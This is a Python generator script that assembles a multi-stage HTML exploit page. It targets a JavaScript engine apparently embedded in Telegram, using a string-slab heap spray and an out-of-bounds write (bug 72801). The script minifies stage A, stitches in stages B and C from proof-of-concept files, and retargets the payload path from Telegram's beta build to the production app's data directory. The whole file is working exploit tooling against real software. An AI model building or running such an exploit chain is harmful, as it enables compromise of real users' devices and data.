#!/usr/bin/env python3
"""Generate the string-slab route-2 payload for 72801.

b is class 512 (9 cpool floats) so the OOB target offset is independent of
b's block index; the spray is 479-char strings (pure class-512 slabs).

Usage: python3 gen_s2s.py OUT.html [--np 2600] [--nq 2600] [--host]
"""
import argparse, re, subprocess, sys, zlib, os

SRC = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        'payload', 's2s_stageA_dev.js')).read()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('out')
    ap.add_argument('--np', type=int, default=2600)
    ap.add_argument('--nq', type=int, default=2600)
    ap.add_argument('--host', action='store_true')
    a = ap.parse_args()

    src = SRC.replace('var NP = 2600, NQ = 2600', 'var NP = %d, NQ = %d' % (a.np, a.nq))
    if a.host:
        src += 'throw new Error("RESULT " + mark);\n'
    open('/tmp/opencode/_s2s_gen.js', 'w').write(src)
    mn = subprocess.run(['terser', '/tmp/opencode/_s2s_gen.js', '-c', 'passes=2', '-m'],
                        capture_output=True, text=True)
    if mn.returncode != 0:
        sys.exit(mn.stderr)
    A = mn.stdout.strip()

    base = os.path.join(os.path.dirname(os.path.abspath(__file__)))
    poc = os.path.join(base, '..', 'qjs_fork_audit', 'mte_route2_20261108', 'poc')
    if a.host:
        ref = open(os.path.join(poc, 's2_full_g9_host.html')).read()
        m = dict((n, s) for n, s in re.findall(r'<script id="([^"]+)">(.*?)</script>', ref, re.S))
        B, C = m['stageB'], m['stageC']
    else:
        ref = open(os.path.join(poc, 's2_device_candidate.html')).read()
        m = dict((n, s) for n, s in re.findall(r'<script id="([^"]+)">(.*?)</script>', ref, re.S))
        B = m['stageB'].replace('id>/data/data/org.telegram.messenger.beta/files/n1',
                                'id>/data/data/org.telegram.messenger/files/n1')
        C = m['stageC']

    html = ('<!doctype html><body><div id="v">Ok</div>'
            '<script id="stageA">' + A + '</script>'
            '<script id="stageB">' + B + '</script>'
            '<script id="stageC">' + C + '</script>')
    open(a.out, 'w').write(html)
    print('%s raw %d zlib9 %d' % (a.out, len(html), len(zlib.compress(html.encode(), 9))))


if __name__ == '__main__':
    main()
